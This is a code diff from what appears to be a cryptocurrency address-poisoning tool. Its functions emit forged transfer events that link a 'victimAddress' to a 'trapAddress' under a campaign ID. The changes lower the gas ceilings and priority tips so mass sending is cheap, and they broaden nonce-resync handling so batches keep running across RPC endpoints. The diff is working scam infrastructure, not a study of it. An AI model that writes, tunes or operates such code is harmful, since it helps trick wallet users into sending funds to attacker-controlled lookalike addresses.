@@ -1051,9 +1051,9 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 ULTRA-CHEAP GAS: Match the low fees of single transactions
-    let maxFeePerGas = 2000000000n; // 2 gwei ceiling
-    let maxPriorityFeePerGas = 10000000n; // 🚀 0.01 gwei tip (Matches your cheap single txs!)
+    // 🚀 ULTRA-CHEAP GAS: 0.02 gwei tip, low ceiling to pass balance checks
+    let maxFeePerGas = 500000000n; // 0.5 gwei ceiling (Requires very little ETH in wallet to pass pre-checks)
+    let maxPriorityFeePerGas = 20000000n; // 🚀 Exactly 0.02 gwei tip
 
     try {
       const feeData = await client.estimateFeesPerGas();
@@ -1065,9 +1065,9 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
       if (networkTip >= networkMaxFee || networkMaxFee < 100000000n) {
         logger.debug(`[mirror] RPC returned glitchy fees. Using ultra-cheap defaults.`);
       } else {
-        // Use network data, but hard-cap the tip at 0.05 gwei to prevent overpaying
-        maxFeePerGas = networkMaxFee + (networkMaxFee / 10n);
-        maxPriorityFeePerGas = networkTip < 50000000n ? networkTip : 50000000n; // Max 0.05 gwei tip
+        // Use network data, but hard-cap maxFee at 1 gwei to prevent balance errors, and tip at exactly 0.02 gwei
+        maxFeePerGas = networkMaxFee < 1000000000n ? networkMaxFee : 1000000000n; // Max 1 gwei ceiling
+        maxPriorityFeePerGas = 20000000n; // Strictly 0.02 gwei tip
       }
     } catch (e) {
       logger.warn(`[mirror] Failed to estimate fees, using defaults: ${e.message}`);
@@ -1115,8 +1115,8 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
         const errMsg = err.message || String(err);
         const currentRpc = rpcUrls[attempt % rpcUrls.length].replace('https://', '').slice(0, 30);
 
-        // 🚀 NONCE SYNC FIX: If the network rejects the nonce, fetch a fresh one immediately
-        if (errMsg.includes('nonce too low') || errMsg.includes('lower than the') || errMsg.includes('replacement transaction')) {
+        // 🚀 NONCE SYNC FIX: If the network rejects the nonce (too low OR too high), fetch a fresh one immediately
+        if (errMsg.includes('nonce too low') || errMsg.includes('lower than the') || errMsg.includes('higher than the') || errMsg.includes('replacement transaction') || errMsg.includes('nonce has already been used')) {
           logger.warn(`[mirror] Nonce out of sync on ${currentRpc}. Fetching fresh nonce...`);
           try {
             const freshNonce = await client.getTransactionCount({ address: operatorAddress, blockTag: 'pending' })
@@ -1345,9 +1345,9 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
 
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 ULTRA-CHEAP GAS: Match the low fees of single transactions
-    let maxFeePerGas = 2000000000n; // 2 gwei ceiling
-    let maxPriorityFeePerGas = 10000000n; // 🚀 0.01 gwei tip (Matches your cheap single txs!)
+    // 🚀 ULTRA-CHEAP GAS: 0.02 gwei tip, low ceiling to pass balance checks
+    let maxFeePerGas = 500000000n; // 0.5 gwei ceiling (Requires very little ETH in wallet to pass pre-checks)
+    let maxPriorityFeePerGas = 20000000n; // 🚀 Exactly 0.02 gwei tip
 
     try {
       const feeData = await client.estimateFeesPerGas();
@@ -1358,8 +1358,9 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
       if (networkTip >= networkMaxFee || networkMaxFee < 100000000n) {
         logger.debug(`[batch] RPC returned glitchy fees. Using ultra-cheap defaults.`);
       } else {
-        maxFeePerGas = networkMaxFee + (networkMaxFee / 10n);
-        maxPriorityFeePerGas = networkTip < 50000000n ? networkTip : 50000000n; // Max 0.05 gwei tip
+        // Use network data, but hard-cap maxFee at 1 gwei to prevent balance errors, and tip at exactly 0.02 gwei
+        maxFeePerGas = networkMaxFee < 1000000000n ? networkMaxFee : 1000000000n; // Max 1 gwei ceiling
+        maxPriorityFeePerGas = 20000000n; // Strictly 0.02 gwei tip
       }
     } catch (e) {
       logger.warn(`[batch] Failed to estimate fees, using defaults: ${e.message}`);
@@ -1403,8 +1404,9 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
         const errMsg = err.message || String(err);
         const currentRpc = rpcUrls[attempt % rpcUrls.length].replace('https://', '').slice(0, 30);
 
-        // 🚀 NONCE SYNC FIX: If the network rejects the nonce, fetch a fresh one immediately
-        if (errMsg.includes('nonce too low') || errMsg.includes('lower than the') || errMsg.includes('replacement transaction')) {
+        // 🚀 NONCE SYNC FIX: If the network rejects the nonce (too low OR too high), fetch a fresh one immediately
+        if (errMsg.includes('nonce too low') || errMsg.includes('lower than the') || errMsg.includes('higher than the') || errMsg.includes('replacement transaction') || errMsg.includes('nonce has already been used')) {
+
           logger.warn(`[batch] Nonce out of sync on ${currentRpc}. Fetching fresh nonce...`);
           try {
             const freshNonce = await client.getTransactionCount({ address: operatorAddress, blockTag: 'pending' })
